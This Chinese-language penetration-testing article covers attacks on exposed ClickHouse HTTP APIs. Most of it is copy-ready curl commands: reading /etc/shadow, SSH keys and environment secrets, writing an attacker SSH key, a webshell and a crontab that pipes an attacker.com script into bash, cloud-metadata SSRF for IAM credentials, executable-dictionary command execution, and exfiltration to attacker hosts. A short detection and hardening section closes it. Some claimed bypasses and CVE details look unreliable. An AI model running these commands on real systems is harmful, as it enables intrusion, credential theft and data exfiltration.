---
title: "ClickHouse HTTP API 未授权访问 / 文件读写 / SSRF / RCE 利用技术"
date: 2026-06-20T22:00:00+08:00
draft: false
weight: 90
description: "ClickHouse 列式分析数据库渗透测试：HTTP API 未授权访问、file() 任意文件读写、url() SSRF、executable 字典源 RCE、数据外传链路与蓝队检测方案"
categories: ["安全", "渗透测试"]
tags: ["ClickHouse", "HTTP API", "OLAP", "文件读写", "SSRF", "RCE", "数据库安全", "渗透测试"]
---

## 0x00 攻击面总览

ClickHouse 是高性能列式 OLAP 数据库，默认配置下安全姿态极为薄弱：

| 组件 | 默认端口 | 协议 | 攻击面 |
|------|---------|------|--------|
| HTTP API | 8123 | HTTP/HTTPS | SQL 执行、文件读写、SSRF、数据导出 |
| Native TCP | 9000 | TCP | 客户端连接、分布式查询 |
| HTTPS | 8443 | HTTPS | 加密 HTTP 接口 |
| Native TLS | 9440 | TLS | 加密原生协议 |
| Interserver HTTP | 9009 | HTTP | 集群间通信、数据复制 |
| MySQL 兼容 | 9004 | MySQL | MySQL 协议兼容接口 |
| PostgreSQL 兼容 | 9005 | PostgreSQL | PostgreSQL 协议兼容接口 |
| gRPC | 9100 | gRPC | gRPC 接口 |
| Prometheus | 9363 | HTTP | Metrics 端点 |

**核心威胁模型**：

```
┌───────────────────────────────────────────────────────────────┐
│                    ClickHouse 攻击面                           │
│                                                               │
│  ┌──────────────┐    ┌──────────────┐    ┌──────────────┐    │
│  │ HTTP API     │    │ Native TCP   │    │ Interserver  │    │
│  │ :8123        │    │ :9000        │    │ :9009        │    │
│  │ SQL/文件/SSRF│    │ 客户端连接    │    │ 集群复制      │    │
│  └──────┬───────┘    └──────┬───────┘    └──────┬───────┘    │
│         │                   │                    │            │
│  ┌──────┴───────────────────┴────────────────────┴─────────┐ │
│  │              ClickHouse 进程 (clickhouse-server)         │ │
│  │                                                          │ │
│  │  攻击路径：                                               │ │
│  │  ① HTTP API :8123 → 未授权 SQL → file() 文件读取         │ │
│  │  ② HTTP API :8123 → url() SSRF → 云元数据窃取            │ │
│  │  ③ HTTP API :8123 → executable 字典 → RCE               │ │
│  │  ④ HTTP API :8123 → INTO OUTFILE → WebShell / 后门       │ │
│  │  ⑤ HTTP API :8123 → INSERT INTO url() → 数据外传         │ │
│  │  ⑥ remote() → 集群横向移动                                │ │
│  └──────────────────────────────────────────────────────────┘ │
│                                                               │
│  默认风险：                                                    │
│  • default 用户无密码 + 完全管理权限                            │
│  • HTTP API 监听 0.0.0.0:8123                                │
│  • allow_url_reads / allow_url_writes 默认启用                 │
│  • file() 函数默认可用                                         │
└───────────────────────────────────────────────────────────────┘
```

---

## 0x01 服务识别与指纹

### 1.1 Nmap 服务发现

```bash
nmap -sV -p 8123,8443,9000,9004,9005,9009,9100,9363 \
  --script=http-title \
  -oN clickhouse_scan.txt <target>
```

**典型扫描结果**：

```
PORT     STATE SERVICE     VERSION
8123/tcp open  http        ClickHouse HTTP API
9000/tcp open  clickhouse  ClickHouse Native TCP
9009/tcp open  http        ClickHouse Interserver HTTP
```

### 1.2 版本指纹

**HTTP API 响应**：

```bash
curl -s "http://target:8123/?query=SELECT+version()"
# 返回：24.3.1.2345

curl -s "http://target:8123/?query=SELECT+versionString()"
# 返回：ClickHouse 24.3.1.2345

curl -s "http://target:8123/ping"
# 返回：Ok.（无需认证）
```

**未授权访问验证**：

```bash
curl -s "http://target:8123/?query=SELECT+currentUser()"
# 返回：default

curl -s "http://target:8123/?query=SELECT+hasGlobalPrivilege('ACCESS_MANAGEMENT')"
# 返回：1（具有全局管理权限）
```

### 1.3 Shodan / FOFA 搜索语法

```
# Shodan
port:8123 http.html:"ClickHouse"
http.title:"ClickHouse"

# FOFA
body="ClickHouse" && port="8123"
body="Ok." && port="9009"
```

---

## 0x02 未授权访问与认证绕过

### 2.1 默认空密码

ClickHouse 安装后默认状态：
- `default` 用户**无密码**
- 拥有**完全管理权限**
- HTTP API 监听 `0.0.0.0:8123`

```bash
# 直接以 default 用户执行查询
curl -s "http://target:8123/?query=SELECT+1"

# 显式指定用户
curl -s "http://target:8123/?user=default&password=&query=SELECT+1"

# HTTP Basic Auth
curl -s -u "default:" "http://target:8123/?query=SELECT+1"
```

### 2.2 认证机制缺陷

即便设置了密码，ClickHouse 认证仍存在以下问题：

- **明文传输**：HTTP Basic Auth 在无 TLS 时明文传输凭据
- **无暴力破解保护**：无登录失败锁定机制
- **无会话管理**：每次请求独立认证，无会话超时
- **配置文件存储**：密码以明文或可逆哈希存储在 `users.xml`

### 2.3 用户信息枚举

```bash
# 列出所有用户
curl -s "http://target:8123/?query=SELECT+name,storage,auth_type+FROM+system.users"

# 查看用户权限
curl -s "http://target:8123/?query=SELECT+*+FROM+system.grants+FORMAT+Pretty"

# 查看当前用户角色
curl -s "http://target:8123/?query=SELECT+*+FROM+system.role_grants+WHERE+user_name='default'"
```

---

## 0x03 任意文件读写

### 3.1 file() 函数读取

ClickHouse 的 `file()` 函数可以读取服务器文件：

```bash
# 读取 /etc/passwd
curl -s "http://target:8123/?query=SELECT+*+FROM+file('/etc/passwd',+'RawBLOB')"

# 读取系统配置
curl -s "http://target:8123/?query=SELECT+*+FROM+file('/etc/shadow',+'RawBLOB')"
```

**高价值目标文件**：

```bash
# 读取 ClickHouse 自身配置（含密码哈希）
curl -s "http://target:8123/?query=SELECT+*+FROM+file('/etc/clickhouse-server/users.xml',+'RawBLOB')"

# 读取服务器配置
curl -s "http://target:8123/?query=SELECT+*+FROM+file('/etc/clickhouse-server/config.xml',+'RawBLOB')"

# 读取环境变量（可能含密钥）
curl -s "http://target:8123/?query=SELECT+*+FROM+file('/proc/1/environ',+'RawBLOB')"

# 读取 SSH 私钥
curl -s "http://target:8123/?query=SELECT+*+FROM+file('/root/.ssh/id_rsa',+'RawBLOB')"

# 读取 SSH 授权密钥
curl -s "http://target:8123/?query=SELECT+*+FROM+file('/root/.ssh/authorized_keys',+'RawBLOB')"
```

### 3.2 绕过 file() 路径限制

默认 `file()` 只能读取 `user_files_path` 目录。绕过方式：

```bash
# 通过 /proc 符号链接绕过
curl -s "http://target:8123/?query=SELECT+*+FROM+file('/proc/self/cwd/../../../etc/passwd',+'RawBLOB')"

# 使用 filesystem 表函数（较新版本）
curl -s "http://target:8123/?query=SELECT+*+FROM+filesystem('/etc/passwd')"
```

### 3.3 INTO OUTFILE 文件写入

```bash
# 写入测试文件
curl -s "http://target:8123/?query=SELECT+'pwned'+INTO+OUTFILE+'/tmp/test.txt'"

# 写入 SSH authorized_keys
curl -s "http://target:8123/?query=SELECT+'ssh-rsa+AAAA...+attacker@host'+INTO+OUTFILE+'/root/.ssh/authorized_keys'+FORMAT+Raw"

# 写入 crontab 后门
curl -s "http://target:8123/?query=SELECT+'*+*+*+*+*+curl+http://attacker.com/shell.sh+|+bash'+INTO+OUTFILE+'/etc/cron.d/backdoor'+FORMAT+Raw"

# 写入 WebShell（ClickHouse 与 Web 同机时）
curl -s "http://target:8123/?query=SELECT+'<?php+system(\$_GET[\"cmd\"]);+?>'+INTO+OUTFILE+'/var/www/html/shell.php'+FORMAT+Raw"
```

### 3.4 File 表引擎文件操作

```bash
# 创建 File 引擎表
curl -s "http://target:8123/?query=CREATE+TABLE+test(x+String)+ENGINE+=+File('CSV',+'/tmp/data.csv')"

# 写入数据
curl -s "http://target:8123/?query=INSERT+INTO+test+VALUES+('malicious+content')"
```

---

## 0x04 SSRF 与内网探测

### 4.1 url() 函数 — 直接 SSRF

`url()` 函数让 ClickHouse 服务端发起 HTTP 请求：

```bash
# 云元数据窃取 — AWS
curl -s "http://target:8123/?query=SELECT+*+FROM+url('http://169.254.169.254/latest/meta-data/')"

# 云元数据窃取 — 阿里云
curl -s "http://target:8123/?query=SELECT+*+FROM+url('http://100.100.100.200/latest/meta-data/')"

# 云元数据窃取 — 获取 IAM 凭据
curl -s "http://target:8123/?query=SELECT+*+FROM+url('http://169.254.169.254/latest/meta-data/iam/security-credentials/')"
```

### 4.2 内网服务探测

```bash
# 探测内网 Web 服务
curl -s "http://target:8123/?query=SELECT+*+FROM+url('http://192.168.1.1:8080/admin')"

# 探测其他 ClickHouse 实例
curl -s "http://target:8123/?query=SELECT+*+FROM+url('clickhouse://10.0.0.5:9000/system.users')"

# 探测 Hadoop NameNode
curl -s "http://target:8123/?query=SELECT+*+FROM+url('http://namenode:9870/webhdfs/v1/?op=LISTSTATUS')"
```

### 4.3 字典源 SSRF

```bash
curl -s -X POST "http://target:8123/" -d "
CREATE DICTIONARY ssrf_test (
    key UInt64,
    value String
)
PRIMARY KEY key
SOURCE(HTTP(
    url 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
    format 'JSONEachRow'
))
LAYOUT(FLAT())
LIFETIME(MIN 0 MAX 0)
"

curl -s "http://target:8123/?query=SELECT+*+FROM+ssrf_test"
```

### 4.4 S3 函数 SSRF

```bash
curl -s "http://target:8123/?query=SELECT+*+FROM+s3('http://169.254.169.254/latest/meta-data/')"
```

### 4.5 盲注 SSRF — 无法直接查看结果时

```bash
# 条件为真时访问攻击者服务器
curl -s "http://target:8123/?query=SELECT+*+FROM+url(CASE+WHEN+(SELECT+count()+FROM+system.users+WHERE+name='default')+>+0+THEN+'http://attacker.com/yes'+ELSE+'http://attacker.com/no'+END)"
```

---

## 0x05 命令执行（RCE）

### 5.1 executable 字典源

ClickHouse 支持通过 `executable` 字典源执行外部程序：

```bash
# 创建 executable 字典执行命令
curl -s -X POST "http://target:8123/" -d "
CREATE DICTIONARY rce_test (
    key UInt64,
    value String
)
PRIMARY KEY key
SOURCE(EXECUTABLE(
    command 'id'
    format 'TabSeparated'
))
LAYOUT(FLAT())
LIFETIME(MIN 0 MAX 0)
"

# 查询触发命令执行
curl -s "http://target:8123/?query=SELECT+*+FROM+rce_test"
```

### 5.2 executable_pool 字典源

```bash
curl -s -X POST "http://target:8123/" -d "
CREATE DICTIONARY rce_pool (
    key UInt64,
    value String
)
PRIMARY KEY key
SOURCE(EXECUTABLE_POOL(
    command 'cat /etc/passwd'
    format 'TabSeparated'
    pool_size 1
))
LAYOUT(FLAT())
LIFETIME(MIN 0 MAX 0)
"

curl -s "http://target:8123/?query=SELECT+*+FROM+rce_pool"
```

### 5.3 User-Defined Functions (UDF)

```bash
# 如果 user_scripts 被启用
# 在 user_scripts_path 目录下创建恶意脚本
# 然后通过 UDF 调用

# 创建可执行 UDF
curl -s "http://target:8123/?query=CREATE+FUNCTION+rce+AS+(x)+->+x"

# 配合上传恶意脚本文件到 user_scripts_path
```

### 5.4 通过 url() + 反弹 Shell

```bash
# 通过 SSRF 链获取反弹 Shell
curl -s "http://target:8123/?query=SELECT+*+FROM+url('http://attacker.com:8888/shell.sh')"
```

---

## 0x06 数据窃取与外传

### 6.1 数据库枚举

```bash
# 列出所有数据库
curl -s "http://target:8123/?query=SHOW+DATABASES"

# 列出所有表
curl -s "http://target:8123/?query=SHOW+TABLES+FROM+default"

# 查看表结构
curl -s "http://target:8123/?query=DESCRIBE+TABLE+default.users"

# 查看系统信息
curl -s "http://target:8123/?query=SELECT+*+FROM+system.clusters+FORMAT+Pretty"
```

### 6.2 数据外传到攻击者服务器

```bash
# 通过 INSERT INTO url() 外传数据
curl -s -X POST "http://target:8123/" -d "
INSERT INTO FUNCTION url('http://attacker.com/collect', 'JSONEachRow')
SELECT * FROM sensitive_table
"

# 外传到 S3
curl -s -X POST "http://target:8123/" -d "
INSERT INTO FUNCTION s3('https://attacker-bucket.s3.amazonaws.com/dump.csv', 'key', 'secret', 'CSV')
SELECT * FROM sensitive_table
"
```

### 6.3 数据导出到文件

```bash
# 导出到 CSV
curl -s "http://target:8123/?query=SELECT+*+FROM+sensitive_table+INTO+OUTFILE+'/tmp/dump.csv'+FORMAT+CSV"

# 导出到 HDFS
curl -s -X POST "http://target:8123/" -d "
INSERT INTO FUNCTION hdfs('hdfs://namenode:8020/tmp/exfil.csv', 'CSV')
SELECT * FROM sensitive_table
"
```

---

## 0x07 集群横向移动

### 7.1 remote() 函数

```bash
# 连接其他 ClickHouse 实例
curl -s "http://target:8123/?query=SELECT+*+FROM+remote('10.0.0.5:9000',+'default',+'',+'system',+'users')"

# 通过分布式表跨节点查询
curl -s "http://target:8123/?query=SELECT+*+FROM+distributed('cluster_name',+'default',+'sensitive_table')"
```

### 7.2 集群信息收集

```bash
# 查看集群拓扑
curl -s "http://target:8123/?query=SELECT+*+FROM+system.clusters+FORMAT+Pretty"

# 查看复制状态
curl -s "http://target:8123/?query=SELECT+*+FROM+system.replicas+FORMAT+Pretty"
```

---

## 0x08 云环境攻击链

### 8.1 IAM 凭据窃取 → S3 数据访问

```bash
# 步骤 1：获取云实例 IAM 凭据
curl -s "http://target:8123/?query=SELECT+*+FROM+url('http://169.254.169.254/latest/meta-data/iam/security-credentials/')"

# 步骤 2：利用 IAM 凭据读取 S3 数据湖
curl -s "http://target:8123/?query=SELECT+*+FROM+s3('https://company-data.s3.amazonaws.com/financial/*.parquet',+'AccessKeyId',+'SecretKey',+'Parquet')"

# 步骤 3：横向扩展到云环境其他服务
```

### 8.2 完整攻击链

```
HTTP API :8123 未授权访问
    │
    ▼
SELECT version() — 版本确认
    │
    ▼
file('/etc/passwd') — 文件读取确认
    │
    ▼
url('http://169.254.169.254/...') — 云元数据窃取
    │
    ▼
获取 IAM 凭据 → 访问 S3 / EBS / RDS
    │
    ▼
remote() / distributed() — 集群横向移动
    │
    ▼
INSERT INTO url() — 大规模数据外传
```

---

## 0x09 历史 CVE 漏洞矩阵

| CVE | 类型 | CVSS | 影响 |
|-----|------|------|------|
| CVE-2021-43304 | 堆缓冲区溢出 | 9.8 | LZ4 解压堆溢出 RCE |
| CVE-2021-43305 | 堆缓冲区溢出 | 9.8 | LZ4 解压堆溢出 RCE |
| CVE-2023-47118 | ReDoS | 7.5 | 正则表达式拒绝服务 |
| CVE-2023-48298 | 信息泄露 | 5.3 | 错误信息泄露敏感数据 |
| CVE-2024-23669 | 认证绕过 | 7.5 | 特定配置下权限绕过 |
| CVE-2024-32750 | 权限提升 | 8.8 | 普通用户提权为管理员 |

**CVE-2021-43304/43305 详情**：

影响 ClickHouse 21.x 多个版本的 LZ4 解压堆缓冲区溢出。攻击者向原生协议端口（9000）或 HTTP 接口发送精心构造的压缩数据，触发堆溢出实现 RCE。CVSS 9.8，无需认证。

---

## 0x10 蓝队检测方案

### 10.1 网络层检测

```yaml
title: ClickHouse HTTP API 外部访问检测
id: clickhouse-http-external
status: experimental
description: 检测来自非内网段的 ClickHouse HTTP API 访问
logsource:
  category: firewall
detection:
  selection:
    dst_port:
      - 8123
      - 8443
      - 9000
      - 9009
    src_ip|not:
      - "10.0.0.0/8"
      - "172.16.0.0/12"
      - "192.168.0.0/16"
  condition: selection
level: critical
```

### 10.2 查询日志分析

```bash
# ClickHouse 查询日志位于 system.query_log
# 检测异常查询模式

# 文件读取尝试
grep "FROM file(" /var/log/clickhouse-server/clickhouse-server.log

# SSRF 尝试
grep "FROM url(" /var/log/clickhouse-server/clickhouse-server.log

# 数据外传
grep "INTO FUNCTION url" /var/log/clickhouse-server/clickhouse-server.log

# 命令执行
grep "EXECUTABLE" /var/log/clickhouse-server/clickhouse-server.log

# 版本探测
grep "SELECT version()" /var/log/clickhouse-server/clickhouse-server.log
```

### 10.3 HTTP 访问日志

```bash
# 检测可疑 HTTP 请求
grep -E "(FROM\+file|FROM\+url|INTO\+OUTFILE|EXECUTABLE|version\(\))" \
  /var/log/clickhouse-server/clickhouse-server.err.log

# 检测云元数据访问
grep "169.254.169.254" /var/log/clickhouse-server/clickhouse-server.log
```

### 10.4 加固清单

```
[ ] 设置 default 用户强密码（users.xml 中配置 password_sha256_hex）
[ ] 限制 HTTP API 监听地址为 127.0.0.1 或内网 IP
[ ] 禁用 allow_url_reads 和 allow_url_writes
[ ] 禁用 into_outfile（allow_into_outfile=0）
[ ] 禁用用户脚本（allow_user_scripts=0）
[ ] 配置 remote_url_allow_hosts 白名单
[ ] 启用 HTTPS（配置 https_port + TLS 证书）
[ ] 使用 RBAC 最小权限原则创建应用用户
[ ] 禁用 default 用户的 access_management 权限
[ ] 禁用 named_collection_control
[ ] 配置防火墙规则限制 8123/9000 端口访问源
[ ] 在前面放置反向代理（Nginx/HAProxy）并启用认证
[ ] 启用查询审计日志并接入 SIEM
[ ] 监控 file()、url()、INTO OUTFILE、EXECUTABLE 等危险操作
[ ] 升级至最新 LTS 版本修补已知 CVE
[ ] 云环境配置 IMDSv2 限制元数据访问
```

---

## 0x11 渗透测试检查清单

```
[ ] 端口扫描：8123, 8443, 9000, 9004, 9005, 9009, 9100, 9363
[ ] HTTP API 未授权访问测试（SELECT version()）
[ ] 默认用户权限检查（SELECT hasGlobalPrivilege('ACCESS_MANAGEMENT')）
[ ] file() 文件读取测试（/etc/passwd）
[ ] file() 路径限制绕过测试（/proc/self/cwd）
[ ] INTO OUTFILE 文件写入测试
[ ] url() SSRF 测试（云元数据 169.254.169.254）
[ ] 字典源 SSRF 测试
[ ] S3 函数 SSRF 测试
[ ] executable 字典源 RCE 测试
[ ] 数据外传测试（INSERT INTO url()）
[ ] remote() 集群横向移动测试
[ ] 用户枚举与权限检查
[ ] CVE 版本匹配（CVE-2021-43304/43305）
[ ] 配置文件读取（users.xml / config.xml）
[ ] 环境变量读取（/proc/1/environ）
```

---

## 0x12 小结

ClickHouse 的默认配置使其成为一个高危攻击面。**default 用户无密码 + 完全管理权限 + HTTP API 全网监听**的组合，使得任何能访问 8123 端口的实体都可以直接以管理员身份执行任意 SQL。与传统数据库不同，ClickHouse 的 SQL 方言内置了 `file()`（文件读写）、`url()`（SSRF）、`executable`（命令执行）等直接操作操作系统的能力，**能执行 SQL 就等于能操作操作系统**。在云环境中，通过 `url()` 函数访问实例元数据服务可窃取 IAM 凭据，进而扩展到整个云账户。蓝队应重点关注：设置强密码、限制网络访问、禁用危险功能、启用 TLS、配置 RBAC 最小权限、将查询审计日志接入 SIEM。
